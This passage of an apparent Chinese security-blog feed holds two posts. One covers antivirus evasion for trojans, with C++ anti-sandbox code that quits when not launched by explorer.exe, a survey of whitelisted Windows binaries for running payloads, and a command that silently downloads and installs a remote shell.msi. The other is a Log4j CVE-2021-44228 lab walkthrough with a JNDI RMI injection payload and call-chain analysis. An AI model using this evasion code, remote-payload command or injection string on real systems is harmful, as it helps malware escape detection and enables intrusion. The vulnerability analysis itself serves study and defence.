href="https://www.freebuf.com/articles/system/202717.html">https://www.freebuf.com/articles/system/202717.html</a></p><p><a href="https://www.anquanke.com/post/id/186218">https://www.anquanke.com/post/id/186218</a></p><p><a href="https://forum.butian.net/share/758">https://forum.butian.net/share/758</a></p><p><a href="https://drunkmars.top/2021/10/04/%E5%8F%8D%E6%B2%99%E7%AE%B1%E8%B0%83%E8%AF%95/">https://drunkmars.top/2021/10/04/%E5%8F%8D%E6%B2%99%E7%AE%B1%E8%B0%83%E8%AF%95/</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">很多杀软都有自己的后端云沙箱，这些沙箱能够模拟出软件执行所需的运行环境，通过进程hook技术来对软件执行过程中的行为进行分析，判断其是否有敏感的操作行为，或者更高级的检测手法是，将获取到的程序的API调用序列以及其他的一些行为特征输入到智能分析引擎中进行检测。所以，如果我们的木马没有做好反调试，很容易就被沙箱检测出来。</span><br><span class="line"></span><br><span class="line">前言</span><br><span class="line">最简单的反调试的措施就是检测父进程。一般来说，我们手动点击执行的程序的父进程都是explorer。如果一个程序的父进程不是explorer，那么我们就可以认为他是由沙箱启动的。那么我们就直接exit退出，这样，杀软就无法继续对我们进行行为分析了。</span><br><span class="line"></span><br><span class="line">这里主要的思路是获取调用kernel32库中的CreateToolhelp32Snapshot函数获得一个进程快照信息，然后从快照中获取到explorer.exe的进程id信息，然后通过当前进程的pid信息在进程快照中找到其父进程的id信息，最后将两者进行比较，判断当前进程是否是有人工启动的。</span><br><span class="line"></span><br><span class="line">反调试的措施不仅仅是检测父进程，还可以通过调用windows的API接口IsDebuggerPresent来检查当前进程是否正在被调试。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tlhelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">get_parent_processid</span><span class="params">(DWORD pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD ParentProcessID = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    PROCESSENTRY32 pe;</span><br><span class="line"></span><br><span class="line">    HANDLE hkz;</span><br><span class="line"></span><br><span class="line">    HMODULE hModule = <span class="built_in">LoadLibrary</span>(_T(<span class="string">&quot;Kernel32.dll&quot;</span>));</span><br><span class="line"></span><br><span class="line">    FARPROC Address = <span class="built_in">GetProcAddress</span>(hModule, <span class="string">&quot;CreateToolhelp32Snapshot&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (Address == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">OutputDebugString</span>(_T(<span class="string">&quot;GetProc error&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    _asm &#123;</span><br><span class="line">        push <span class="number">0</span></span><br><span class="line">        push <span class="number">2</span></span><br><span class="line">        call Address</span><br><span class="line">    mov hkz, eax</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">pe.dwSize = <span class="built_in">sizeof</span>(PROCESSENTRY32);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">Process32First</span>(hkz, &amp;pe)) &#123;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (pe.th32ProcessID == pid) &#123;</span><br><span class="line">            ParentProcessID = pe.th32ParentProcessID;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (<span class="built_in">Process32Next</span>(hkz, &amp;pe));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ParentProcessID;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">get_explorer_processid</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    DWORD explorer_id = <span class="number">-1</span>;</span><br><span class="line">    PROCESSENTRY32 pe;</span><br><span class="line">    HANDLE hkz;</span><br><span class="line">    HMODULE hModule = <span class="built_in">LoadLibrary</span>(_T(<span class="string">&quot;Kernel32.dll&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hModule == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">OutputDebugString</span>(_T(<span class="string">&quot;Loaddll error&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    FARPROC Address = <span class="built_in">GetProcAddress</span>(hModule, <span class="string">&quot;CreateToolhelp32Snapshot&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (Address == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">OutputDebugString</span>(_T(<span class="string">&quot;GetProc error&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    _asm &#123;</span><br><span class="line">        push <span class="number">0</span></span><br><span class="line">        push <span class="number">2</span></span><br><span class="line">        call Address</span><br><span class="line">    mov hkz, eax</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">pe.dwSize = <span class="built_in">sizeof</span>(PROCESSENTRY32);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">Process32First</span>(hkz, &amp;pe)) &#123;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (_wcsicmp(pe.szExeFile, <span class="string">L&quot;explorer.exe&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            explorer_id = pe.th32ProcessID;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (<span class="built_in">Process32Next</span>(hkz, &amp;pe));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> explorer_id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    DWORD explorer_id = <span class="built_in">get_explorer_processid</span>();</span><br><span class="line">    DWORD parent_id = <span class="built_in">get_parent_processid</span>(<span class="built_in">GetCurrentProcessId</span>());</span><br><span class="line">    <span class="keyword">if</span> (explorer_id == parent_id) </span><br><span class="line">    &#123; <span class="comment">/* 判断父进程id是否和explorer进程id相同&#123; */</span></span><br><span class="line">        <span class="built_in">MessageBox</span>(<span class="number">0</span>, <span class="string">L&quot;Not sandbox&quot;</span>, <span class="string">L&quot;Success&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="二开cs环境准备">二开cs环境准备</h2><p>参考:</p><p><a href="https://www.ol4three.com/2021/11/09/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/CobaltStrike/CobaltStrike%E4%BA%8C%E5%BC%80%E7%8E%AF%E5%A2%83%E5%88%9D%E6%8E%A2/">https://www.ol4three.com/2021/11/09/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/CobaltStrike/CobaltStrike%E4%BA%8C%E5%BC%80%E7%8E%AF%E5%A2%83%E5%88%9D%E6%8E%A2/</a></p><h2 id="白名单">白名单</h2><h3 id="一、MSBuild-exe介绍">一、MSBuild.exe介绍</h3><p>Microsoft Build Engine是一个用于构建应用程序的平台，此引擎也被称为msbuild，它为项目文件提供一个XML模式，该模式控制构建平台如何处理和构建软件。Visual Studio使用MSBuild，但它不依赖于Visual Studio。通过在项目或解决方案文件中调用msbuild.exe，可以在未安装Visual Studio的环境中编译和生成程序。</p><p>说明：Msbuild.exe所在路径没有被系统添加PATH环境变量中，因此，Msbuild命令无法直接在cmd中使用。需要带上路径：C:\Windows\Microsoft.NET\Framework\v4.0.30319。</p><p>适用条件:.NET Framework&gt;=4.0</p><p>xml配置文件写法：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/LyShark/p/11331476.html">https://www.cnblogs.com/LyShark/p/11331476.html</a></p><p><a href="https://micro8.gitbook.io/micro8/contents-1/71-80/71-ji-yu-bai-ming-dan-msbuild.exe-zhi-hang-payload-di-yi-ji">https://micro8.gitbook.io/micro8/contents-1/71-80/71-ji-yu-bai-ming-dan-msbuild.exe-zhi-hang-payload-di-yi-ji</a></p><p><a href="https://pplsec.github.io/2019/03/26/MSBuild.exe-bypass-application-whitelisting/">https://pplsec.github.io/2019/03/26/MSBuild.exe-bypass-application-whitelisting/</a></p><p><a href="http://wiki.tidesec.com/docs/bypassav">http://wiki.tidesec.com/docs/bypassav</a></p><p><a href="https://www.freebuf.com/articles/network/197706.html">https://www.freebuf.com/articles/network/197706.html</a></p><h3 id="二、msiexec-exe介绍">二、msiexec.exe介绍</h3><p>看到msiexec可能还有点陌生，但说道.msi可能就比较熟悉了，在windows下很多软件安装就是.msi格式的。当Windows操作系统安装了Windows Installer引擎，而MSI软件包使用该引擎来 安装应用程序，解释包和安装产品的可执行程序就是我们这用到 的Msiexec.exe。</p><p>之前在介绍免杀工具的时候有些工具就可以生成msi格式的payload，比如专题6介绍的venom：<a href="https://mp.weixin.qq.com/s/CbfxupSWEPB86tBZsmxNCQ,%E5%85%B6%E5%AE%9Emsfvenom%E4%B9%9F%E5%8F%AF%E4%BB%A5%E7%94%9F%E6%88%90msi%E6%A0%BC%E5%BC%8F%E7%9A%84payload%EF%BC%8C%E4%B8%8D%E8%BF%87%E8%A2%AB%E6%9D%80%E8%BD%AF%E6%9F%A5%E6%9D%80%E7%9A%84%E6%AF%94%E8%BE%83%E5%8E%89%E5%AE%B3%E4%BA%86%E3%80%82">https://mp.weixin.qq.com/s/CbfxupSWEPB86tBZsmxNCQ,其实msfvenom也可以生成msi格式的payload，不过被杀软查杀的比较厉害了。</a></p><p>msi文件可以双击执行，也可以命令行静默执行，而且msiexec也同样支持远程下载功能，将msi文件上传到服务器，通过如下命令远程执行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec /q /i http://www.tidesec.com/shell/shell.msi</span><br></pre></td></tr></table></figure><p>参考：<a href="https://www.cnblogs.com/backlion/p/10493910.html">https://www.cnblogs.com/backlion/p/10493910.html</a></p><p><a href="http://wiki.tidesec.com/docs/bypassav">http://wiki.tidesec.com/docs/bypassav</a></p><h3 id="三、Mshta-exe介绍">三、Mshta.exe介绍</h3><p><font style="color:rgb(36, 41, 46);">Mshta.exe是微软Windows操作系统相关程序，英文全称Microsoft HTML Application，可翻译为微软超文本标记语言应用，用于执行.HTA文件。<br></font><font style="color:rgb(36, 41, 46);">目前正常的hta文件用到的很少，偶尔见到了很可能就是恶意软件，很多免杀工具都是对shellcode进行处理后生产.hta文件，在windows下可以直接执行。<br></font>之前工具篇里多个工具都可以生成hta后门：</p><p>参考文章：<a href="https://www.cnblogs.com/backlion/p/10491616.html">https://www.cnblogs.com/backlion/p/10491616.html</a>（多种方法）</p><h3 id="四、InstallUtil-exe介绍">四、InstallUtil.exe介绍</h3><p>InstallUtil.exe算是免杀白名单里使用比较多的一个了，InstallUtil.exe可以用于安装有.NET开发的所有应用安装程序，如果要使用 .NET Framework 开发 Windows 服务，则可以使用installutil.exe命令行快速安装服务应用程序。</p><p>利用过程参考：</p><p><a href="https://pplsec.github.io/2019/03/26/InstallUtil&amp;csc.exe-bypass-application-whitelisting/">https://pplsec.github.io/2019/03/26/InstallUtil&amp;csc.exe-bypass-application-whitelisting/</a></p><p><a href="http://wiki.tidesec.com/docs/bypassav">http://wiki.tidesec.com/docs/bypassav</a>（专题36）</p><h3 id="五、Rundll32-exe介绍">五、Rundll32.exe介绍</h3><p>Rundll32.exe，可以执行32位的DLL文件，以命令行的方式调用动态链接程序库。。它的作用是执行DLL文件中的内部函数，这样在进程当中，只会有Rundll32.exe，而不会有DLL后门的进程，这样就实现了进程上的隐藏。系统中还有一个Rundll.exe文件，可以执行16位的DLL文件。</p><p>DLL文件对于Window的操作系统非常重要，它还决定了自定义Windows的其他程序的运行。动态链接库（DLL）文件是一种文件类型，它向其他程序提供有关如何调用某些内容的指令。因此，多个软件甚至可以同时共享这样的DLL文件。尽管与.exe文件的格式相同,但DLL文件不能像.exe文件那样直接执行。dll文件扩展名可以是：.dll（动态链接库）、.ocx（ActiveX控件）、.cpl（控制面板）、.drv（设备驱动程序）。</p><p>Rundll32.exe令行下的使用方法为：Rundll32.exe DLLname,Functionname,需注意x86，x64位的Rundll32调用，64位的系统默认调用的是64位Rundll32.exe(在C:\Windows\System32目录下)。</p><p>Windows 7 默认位置：</p><p>64位 C:\Windows\System32\rundll32.exe</p><p>32位 C:\Windows\SysWOW64\rundll32.exe</p><p>利用方式可以参考：</p><p><a href="https://www.cnblogs.com/backlion/p/10488747.html">https://www.cnblogs.com/backlion/p/10488747.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;shellcode-loader&quot;&gt;shellcode loader&lt;/h2&gt;
&lt;p&gt;shellcode要想执行需要经历如下几个过程：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;申请一块内存；&lt;/li&gt;
&lt;li&gt;把shellcode加载到这块内存；&lt;/li&gt;
&lt;li&gt;执行这块内存</summary>
      
    
    
    
    <category term="攻防渗透" scheme="https://oceanzbz.github.io/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="免杀" scheme="https://oceanzbz.github.io/tags/%E5%85%8D%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>Log4j反序列化</title>
    <link href="https://oceanzbz.github.io/post/4115d349.html"/>
    <id>https://oceanzbz.github.io/post/4115d349.html</id>
    <published>2024-12-30T06:53:56.000Z</published>
    <updated>2025-03-05T07:24:36.793Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CVE-2021-44228">CVE-2021-44228</h2><h3 id="环境搭建">环境搭建</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">2.14</span><span class="number">.1</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">2.14</span><span class="number">.1</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Level;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.core.LoggerContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.core.config.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.core.config.LoggerConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Log4j_vul</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(Log4j_vul.class);</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">LoggerContext</span> <span class="variable">ctx</span>          <span class="operator">=</span> (LoggerContext) LogManager.getContext(<span class="literal">false</span>);</span><br><span class="line">        <span class="type">Configuration</span> <span class="variable">config</span>       <span class="operator">=</span> ctx.getConfiguration();</span><br><span class="line">        <span class="type">LoggerConfig</span> <span class="variable">loggerConfig</span> <span class="operator">=</span> config.getLoggerConfig(LogManager.ROOT_LOGGER_NAME);</span><br><span class="line">        loggerConfig.setLevel(Level.ALL);</span><br><span class="line">        ctx.updateLoggers();</span><br><span class="line">        <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> <span class="string">&quot;$&#123;jndi:rmi://10.169.5.252:1099/mad9ab&#125;&quot;</span>;</span><br><span class="line">        logger.info(message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里说一嘴这里其实用info /error/ warn方法都是可以触发漏洞的只不过他们三个方法个字对应的日志级别不一样。</p><h3 id="调用链">调用链</h3><p>由于后半部分是由于jndi漏洞造成的，所以我们先将断点下在InitialContext类的lookup方法这里然后回看调用栈。</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733839795568-08d8c1e8-c11b-4c66-960e-f65b2cd58de0.png" alt=""></p><p>这里先给出调用栈，然后我们逐步分析一下</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733839825467-f951bc28-7bed-4b61-b529-1bd469c67d7a.png" alt=""></p><p>这里会跟进logIfEnabled方法里跟进去</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733839846909-007c579e-eee1-48c9-832c-b92420eabd02.png" alt=""></p><p>这里会传入我们定义的日志信息还有日志等级等我们这里的等级是INFO，继续向下跟进去logMessage方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733839967779-d246cb0c-05ac-49f1-a75a-ce9b54ece585.png" alt=""></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733840038961-c710b439-aec7-4962-87b3-10d527d9f6c3.png" alt=""></p><p>可以看到使用messageFactory对象创建一个message对象这里面包含的其实还是我们传入的日志信息继续向下跟</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733840065085-dfbc130a-0240-4d42-bda3-28ae39a0709a.png" alt=""></p><p>没啥逻辑跟进去</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733840085492-bc7cab09-576c-4544-b62a-63e0df81b517.png" alt=""></p><p>这里也没什么东西也继续跟进</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733840131130-a7016a0b-819c-4df6-b60a-64233fa06bf8.png" alt=""></p><p>这里也是没啥说的后面会调用过个log方法我们直接略过跟到关键部分</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733840238870-c76eae13-fa7f-4056-a583-3cbbc6bb3821.png" alt=""></p><p>跟到PatternLayout类的toSerialize方法里在这里有一个for循环，在循环到第8次的时候会得到MessagePatternConverter对象，调用其format方法跟到里面看看</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733840352345-d8ae058e-2986-4e87-a910-40f1a15fa62d.png" alt=""></p><p>这里的converter是MessagePatternConverter继续跟进</p><p>这里我就直接引用师哥的解释</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">format</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> StringBuilder toAppendTo)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">Message</span> <span class="variable">msg</span> <span class="operator">=</span> event.getMessage();</span><br><span class="line">    <span class="comment">// 如果msg实现了StringBuilderFormattable接口，进入这里</span></span><br><span class="line">    <span class="keyword">if</span> (msg <span class="keyword">instanceof</span> StringBuilderFormattable) &#123;</span><br><span class="line">        <span class="comment">// textRenderer为null，这里直接为toAppendTo</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">doRender</span> <span class="operator">=</span> textRenderer != <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">StringBuilder</span> <span class="variable">workingBuilder</span> <span class="operator">=</span> doRender ? <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="number">80</span>) : toAppendTo;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取初始长度作为偏移量</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">offset</span> <span class="operator">=</span> workingBuilder.length();</span><br><span class="line">        <span class="comment">// 如果msg实现了MultiFormatStringBuilderFormattable接口</span></span><br><span class="line">        <span class="comment">// 不管进入哪个分支，都需要进行formatTo方法进行格式化，作用是将格式化的内容添加到workingBuilder中</span></span><br><span class="line">        <span class="keyword">if</span> (msg <span class="keyword">instanceof</span> MultiFormatStringBuilderFormattable) &#123;</span><br><span class="line">            ((MultiFormatStringBuilderFormattable) msg).formatTo(formats, workingBuilder);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 进入这里</span></span><br><span class="line">            ((StringBuilderFormattable) msg).formatTo(workingBuilder);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// TODO can we optimize this?</span></span><br><span class="line">        <span class="keyword">if</span> (config != <span class="literal">null</span> &amp;&amp; !noLookups) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> offset; i &lt; workingBuilder.length() - <span class="number">1</span>; i++) &#123;</span><br><span class="line">                <span class="comment">// 检查workingBuilder中是否存在$&#123;&#125;格式的占位符</span></span><br><span class="line">                <span class="comment">// 得到i为64</span></span><br><span class="line">                <span class="keyword">if</span> (workingBuilder.charAt(i) == <span class="string">&#x27;$&#x27;</span> &amp;&amp; workingBuilder.charAt(i + <span class="number">1</span>) == <span class="string">&#x27;&#123;&#x27;</span>) &#123;</span><br><span class="line">                    <span class="comment">// 提取offset到结尾的部分，相当于获取formatTo加上去的内容</span></span><br><span class="line">                    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> workingBuilder.substring(offset, workingBuilder.length());</span><br><span class="line">                    workingBuilder.setLength(offset);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 使用配置对象中的StrSubstitutor替换占位符为相应的值</span></span><br><span class="line">                    workingBuilder.append(config.getStrSubstitutor().replace(event, value));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果需要渲染，则使用textRenderer对workingBuilder进行渲染，并将结果追加到toAppendTo中</span></span><br><span class="line">        <span class="keyword">if</span> (doRender) &#123;</span><br><span class="line">            textRenderer.render(workingBuilder, toAppendTo);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 后面可以忽略</span></span><br><span class="line">    <span class="keyword">if</span> (msg != <span class="literal">null</span>) &#123;</span><br><span class="line">        String result;</span><br><span class="line">        <span class="comment">// 如果消息实现了MultiformatMessage接口，调用getFormattedMessage方法获取格式化后的消息</span></span><br><span class="line">        <span class="keyword">if</span> (msg <span class="keyword">instanceof</span> MultiformatMessage) &#123;</span><br><span class="line">            result = ((MultiformatMessage) msg).getFormattedMessage(formats);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            result = msg.getFormattedMessage();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (result != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 使用config中的StrSubstitutor替换占位符为相应的值</span></span><br><span class="line">            toAppendTo.append(config != <span class="literal">null</span> &amp;&amp; result.contains(<span class="string">&quot;$&#123;&quot;</span>)</span><br><span class="line">                    ? config.getStrSubstitutor().replace(event, result) : result);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            toAppendTo.append(<span class="string">&quot;null&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img 